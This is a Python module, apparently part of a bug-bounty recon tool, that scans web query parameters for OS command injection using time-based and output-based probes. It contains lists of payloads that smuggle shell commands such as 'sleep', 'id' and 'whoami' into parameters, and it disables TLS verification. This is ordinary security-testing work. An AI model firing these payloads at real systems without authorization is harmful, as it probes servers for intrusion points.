# modules/vuln/web/cmdi_scanner.py
"""ReconX - Command Injection Scanner.

Detects OS command injection via time-based and output-based techniques.
⚠️ ACTIVE scanning — only use on authorized targets.
"""

import ssl
import time
import logging
import concurrent.futures
import urllib.request
import urllib.error
import urllib.parse
from datetime import datetime

logger = logging.getLogger("ReconX.cmdi")


# Time-based payloads (sleep 5 — safe, non-destructive)
# Format: (payload, expected_delay_seconds, platform)
TIME_PAYLOADS = [
    # Linux / Unix
    ("; sleep 5", 5, "linux"),
    ("| sleep 5", 5, "linux"),
    ("&& sleep 5", 5, "linux"),
    ("`sleep 5`", 5, "linux"),
    ("$(sleep 5)", 5, "linux"),
    ("%0asleep 5", 5, "linux"),
    ("; sleep 5 #", 5, "linux"),
    ("| ping -c 5 127.0.0.1", 5, "linux"),

    # Windows
    ("& ping -n 5 127.0.0.1 &", 5, "windows"),
    ("| timeout /t 5", 5, "windows"),
]


# Output-based payloads (echo markers)
OUTPUT_PAYLOADS = [
    (";id", "uid=", "linux"),
    ("|id", "uid=", "linux"),
    ("&&id", "uid=", "linux"),
    ("`id`", "uid=", "linux"),
    ("$(id)", "uid=", "linux"),
    (";whoami", None, "linux"),
    ("&whoami&", None, "windows"),
    ("; echo RECONX_MARKER_9x8z", "RECONX_MARKER_9x8z", "linux"),
]


def _make_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _fetch(url, timeout=15):
    """Fetch with timing."""
    start = time.time()
    try:
        req = urllib.request.Request(url, headers={
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
        })
        with urllib.request.urlopen(req, timeout=timeout, context=_make_ctx()) as r:
            body = r.read(100000).decode("utf-8", errors="ignore")
            return r.status, body, time.time() - start
    except urllib.error.HTTPError as e:
        try:
            body = e.read(50000).decode("utf-8", errors="ignore")
        except Exception:
            body = ""
        return e.code, body, time.time() - start
    except Exception as e:
        return None, str(e), time.time() - start


def _build_url(base_url, param, payload):
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query)
    qs[param] = [payload]
    return urllib.parse.urlunparse(
        parsed._replace(query=urllib.parse.urlencode(qs, doseq=True))
    )


def _baseline_time(url, param, timeout=15):
    """Get baseline response time for a param."""
    test_url = _build_url(url, param, "test123")
    _, _, elapsed = _fetch(test_url, timeout=timeout)
    return elapsed


def test_cmdi(url, param, timeout=20, verbose=False):
    """Test command injection on one param."""
    findings = []

    # Get baseline
    baseline_time = _baseline_time(url, param, timeout=timeout)

    if verbose:
        print(f"    [*] param '{param}' baseline: {baseline_time:.2f}s")

    # === Time-based ===
    for payload, expected_delay, platform in TIME_PAYLOADS:
        test_url = _build_url(url, param, payload)
        status, body, elapsed = _fetch(test_url, timeout=timeout)

        if status is None:
            continue

        # Time difference check
        time_diff = elapsed - baseline_time
        if time_diff >= (expected_delay - 1.0):
            findings.append({
                "id": f"cmdi_time_{param}",
                "title": f"Command Injection (time-based) in '{param}'",
                "parameter": param,
                "payload": payload,
                "platform": platform,
                "severity": "critical",
                "bug_class": "command_injection",
                "payout_potential": "$2000-$10000+",
                "confidence": 0.80,
                "url": test_url,
                "evidence": f"Response delayed {time_diff:.1f}s (baseline {baseline_time:.1f}s, expected +{expected_delay}s)",
                "source": "custom_cmdi",
            })
            return findings

    # === Output-based ===
    for payload, expected_out, platform in OUTPUT_PAYLOADS:
        test_url = _build_url(url, param, payload)
        status, body, _ = _fetch(test_url, timeout=timeout)

        if status is None or not body:
            continue

        # Check marker
        if expected_out and expected_out in body and payload not in body:
            findings.append({
                "id": f"cmdi_out_{param}",
                "title": f"Command Injection (output-based) in '{param}'",
                "parameter": param,
                "payload": payload,
                "platform": platform,
                "severity": "critical",
                "bug_class": "command_injection",
                "payout_potential": "$2000-$10000+",
                "confidence": 0.92,
                "url": test_url,
                "evidence": f"Marker '{expected_out}' appeared in response",
                "source": "custom_cmdi",
            })
            return findings

        # Special: whoami check (returns username — need heuristic)
        if expected_out is None and payload in (";whoami", "&whoami&"):
            # Look for typical Unix usernames in output
            for uname in ["root", "www-data", "apache", "nginx", "nobody", "user"]:
                if uname in body.lower() and payload not in body:
                    findings.append({
                        "id": f"cmdi_whoami_{param}",
                        "title": f"Command Injection (whoami) in '{param}'",
                        "parameter": param,
                        "payload": payload,
                        "platform": platform,
                        "severity": "critical",
                        "bug_class": "command_injection",
                        "payout_potential": "$2000-$10000+",
                        "confidence": 0.75,
                        "url": test_url,
                        "evidence": f"Username '{uname}' appeared after whoami",
                        "source": "custom_cmdi",
                    })
                    return findings

    return findings


def _test_time_param(url, param, timeout=20, verbose=False):
    """Time-based detection for one param (baseline + TIME_PAYLOADS, serial).

    Returns a finding dict or None. Must stay sequential per the timing signal.
    """
    baseline_time = _baseline_time(url, param, timeout=timeout)

    if verbose:
        print(f"    [*] param '{param}' baseline: {baseline_time:.2f}s")

    for payload, expected_delay, platform in TIME_PAYLOADS:
        test_url = _build_url(url, param, payload)
        status, body, elapsed = _fetch(test_url, timeout=timeout)

        if status is None:
            continue

        time_diff = elapsed - baseline_time
        if time_diff >= (expected_delay - 1.0):
            return {
                "id": f"cmdi_time_{param}",
                "title": f"Command Injection (time-based) in '{param}'",
                "parameter": param,
                "payload": payload,
                "platform": platform,
                "severity": "critical",
                "bug_class": "command_injection",
                "payout_potential": "$2000-$10000+",
                "confidence": 0.80,
                "url": test_url,
                "evidence": f"Response delayed {time_diff:.1f}s (baseline {baseline_time:.1f}s, expected +{expected_delay}s)",
                "source": "custom_cmdi",
            }
    return None


def _test_output_payload(url, param, payload, expected_out, platform, timeout=8):
    """Output-based detection for a single (non-time) payload.

    Returns a finding dict or None. Safe to run concurrently — no timing signal.
    """
    test_url = _build_url(url, param, payload)
    status, body, _ = _fetch(test_url, timeout=timeout)

    if status is None or not body:
        return None

    if expected_out and expected_out in body and payload not in body:
        return {
            "id": f"cmdi_out_{param}",
            "title": f"Command Injection (output-based) in '{param}'",
            "parameter": param,
            "payload": payload,
            "platform": platform,
            "severity": "critical",
            "bug_class": "command_injection",
            "payout_potential": "$2000-$10000+",
            "confidence": 0.92,
            "url": test_url,
            "evidence": f"Marker '{expected_out}' appeared in response",
            "source": "custom_cmdi",
        }

    # Special: whoami check (returns username — need heuristic)
    if expected_out is None and payload in (";whoami", "&whoami&"):
        for uname in ["root", "www-data", "apache", "nginx", "nobody", "user"]:
            if uname in body.lower() and payload not in body:
                return {
                    "id": f"cmdi_whoami_{param}",
                    "title": f"Command Injection (whoami) in '{param}'",
                    "parameter": param,
                    "payload": payload,
                    "platform": platform,
                    "severity": "critical",
                    "bug_class": "command_injection",
                    "payout_potential": "$2000-$10000+",
                    "confidence": 0.75,
                    "url": test_url,
                    "evidence": f"Username '{uname}' appeared after whoami",
                    "source": "custom_cmdi",
                }
    return None


def scan(target, params=None, timeout=20, verbose=False, workers=5,
         out_timeout=8, time_timeout=None):
    """Full command injection scan.

    Time-based (sleep) payloads stay strictly sequential per target so the
    elapsed-vs-baseline signal is not corrupted; they keep the generous
    ``time_timeout`` (default = ``timeout``) for headroom. Only the
    output-based (non-time) probes are parallelized — distinct params and their
    OUTPUT_PAYLOADS run through a ThreadPoolExecutor (``workers`` kwarg, default
    5) with a shorter ``out_timeout`` (default 8s, capped at ``timeout``).
    Output: at most one finding per param (time preferred over output, as
    before), returned in param order.
    """
    result = {
        "timestamp": datetime.now().isoformat(),
        "target": target,
        "findings": [],
        "tested_params": 0,
        "tested_payloads": 0,
        "error": None,
    }

    parsed = urllib.parse.urlparse(target)
    if params is None:
        params = list(urllib.parse.parse_qs(parsed.query).keys())

    if not params:
        result["error"] = "no parameters to test (URL must have query params)"
        return result

    result["tested_params"] = len(params)
    result["tested_payloads"] = len(params) * (len(TIME_PAYLOADS) + len(OUTPUT_PAYLOADS))

    tt = timeout if time_timeout is None else time_timeout
    ot = min(out_timeout, timeout) if out_timeout is not None else timeout
    w = max(1, int(workers) if workers else 1)

    findings_by_pi = {}  # param index -> finding

    # Phase 1: time-based, strictly sequential (never concurrent sleeps).
    for pi, param in enumerate(params):
        if verbose:
            print(f"    [*] Testing param: {param}")
        tf = _test_time_param(target, param, timeout=tt, verbose=verbose)
        if tf:
            findings_by_pi[pi] = tf

    # Phase 2: output-based, parallel over (pending param, output payload).
    tasks = []
    for pi, param in enumerate(params):
        if pi in findings_by_pi:
            continue  # time hit already reported for this param
        for yi, (payload, expected_out, platform) in enumerate(OUTPUT_PAYLOADS):
            tasks.append((pi, param, yi, payload, expected_out, platform))

    if tasks:
        best = {}  # param index -> (payload index, finding)
        tw = max(1, min(w, len(tasks)))
        with concurrent.futures.ThreadPoolExecutor(max_workers=tw) as ex:
            futs = {
                ex.submit(_test_output_payload, target, param, payload,
                          expected_out, platform, ot): (pi, yi)
                for (pi, param, yi, payload, expected_out, platform) in tasks
            }
            for fut in concurrent.futures.as_completed(futs):
                pi, yi = futs[fut]
                try:
                    finding = fut.result()
                except Exception:
                    finding = None
                if finding:
                    cur = best.get(pi)
                    if cur is None or yi < cur[0]:
                        best[pi] = (yi, finding)
        for pi, (_, finding) in best.items():
            findings_by_pi[pi] = finding

    for pi in range(len(params)):
        if pi in findings_by_pi:
            result["findings"].append(findings_by_pi[pi])

    return result


def print_report(result):
    print("\n" + "=" * 70)
    print("  Command Injection Scanner — ReconX")
    print("=" * 70)

    print(f"\n[*] Target:        {result.get('target')}")
    print(f"[*] Tested params: {result.get('tested_params', 0)}")
    print(f"[*] Findings:      {len(result.get('findings', []))}")

    if result.get("error"):
        print(f"\n[!] {result['error']}")
        return

    if result.get("findings"):
        for f in result["findings"]:
            print(f"\n  🔴 [CRITICAL] {f['title']}")
            print(f"       Parameter: {f['parameter']}")
            print(f"       Payload:   {f['payload']}")
            print(f"       Platform:  {f.get('platform', '?')}")
            print(f"       Evidence:  {f['evidence']}")
            print(f"       Payout:    {f.get('payout_potential', '?')}")
    else:
        print(f"\n[OK] No command injection found")

    print("\n" + "=" * 70 + "\n")


if __name__ == "__main__":
    import sys
    logging.basicConfig(level=logging.INFO)

    if len(sys.argv) < 2:
        print("Usage: python -m modules.vuln.web.cmdi_scanner <url-with-params>")
        print("Example: python -m modules.vuln.web.cmdi_scanner 'https://example.com/ping?host=127.0.0.1'")
        sys.exit(1)

    url = sys.argv[1]
    print(f"\n[*] CMDi scan: {url}")
    print(f"[*] Timeout: 20s per request (time-based uses sleep 5)")

    result = scan(url, verbose=True)
    print_report(result)
